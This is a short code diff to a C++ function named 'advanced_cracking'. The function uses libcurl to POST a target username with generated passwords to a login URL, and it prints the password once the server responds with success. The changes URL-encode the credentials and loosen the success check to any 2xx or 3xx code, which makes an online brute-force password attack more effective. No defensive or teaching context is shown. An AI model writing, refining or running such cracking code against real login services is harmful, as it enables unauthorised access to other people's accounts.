@@ -236,10 +236,14 @@ void advanced_cracking() {
         if (curl) {
             std::string user = target;
             std::string password = generate_password();
-            std::string data = "user=" + user + "&pass=" + password;
+
+            // obtain user data and url-encode it
+            std::string url_user(curl_easy_escape(curl,user.c_str(),0));
+            std::string url_password (curl_easy_escape(curl,password.c_str(),0));
+            std::string data = "user=" + url_user + "&pass=" + url_password;
 
             curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str()); 
 
             curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_data_callback);
 
@@ -251,7 +255,7 @@ void advanced_cracking() {
 
             long http_code = 0;
             curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
-            if (http_code == 200) {
+            if (http_code >=200 && http_code < 400) {
 
                 std::cout << password;
                 found_pass = password;
